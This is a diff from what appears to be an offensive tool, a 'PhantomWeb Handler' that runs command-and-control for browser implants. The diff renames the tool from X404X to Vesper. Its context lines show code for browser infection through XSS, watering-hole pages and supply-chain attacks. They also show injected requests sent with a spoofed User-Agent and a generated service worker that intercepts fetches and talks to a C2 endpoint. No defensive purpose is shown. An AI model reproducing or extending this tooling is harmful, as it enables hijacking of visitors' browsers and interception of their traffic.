@@ -1,6 +1,6 @@
-# X404X Bridge — PhantomWeb Handler
+# Vesper Bridge — PhantomWeb Handler
 # ===================================
-# Controls PhantomWeb browser-native implants from X404X.
+# Controls PhantomWeb browser-native implants from Vesper.
 #
 # PhantomWeb capabilities:
 #   - Browser infection via XSS/watering hole/supply chain
@@ -44,7 +44,7 @@ class PhantomNode:
 
 
 class PhantomController:
-    """Controls PhantomWeb C2 from X404X bridge."""
+    """Controls PhantomWeb C2 from Vesper bridge."""
 
     def __init__(self):
         self.nodes: Dict[str, PhantomNode] = {}
@@ -77,7 +77,7 @@ class PhantomController:
 
             req = urllib.request.Request(
                 injected_url,
-                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) X404X/1.0"},
+                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Vesper/1.0"},
             )
             response = urllib.request.urlopen(req, timeout=10)
             status_code = response.getcode()
@@ -130,7 +130,7 @@ class PhantomController:
                 "error": str(e),
             }
 
-        output_path = "/tmp/x404x_watering_hole.html"
+        output_path = "/tmp/vesper_watering_hole.html"
         html_content = f"""<!DOCTYPE html>
 <html>
 <head><title>{domain}</title></head>
@@ -164,7 +164,7 @@ class PhantomController:
     def deploy_service_worker(self, script_url: str, scope: str = "/") -> dict:
         """Generate a real service worker JS file with fetch interception."""
         sw_code = f"""'use strict';
-const SW_VERSION = 'x404x-1.0';
+const SW_VERSION = 'vesper-1.0';
 const SCOPE = '{scope}';
 const C2_ENDPOINT = '{script_url}';
 
@@ -210,7 +210,7 @@ self.addEventListener('message', (event) => {{
 }});
 """
 
-        output_path = "/tmp/x404x_sw.js"
+        output_path = "/tmp/vesper_sw.js"
         try:
             with open(output_path, "w") as f:
                 f.write(sw_code)
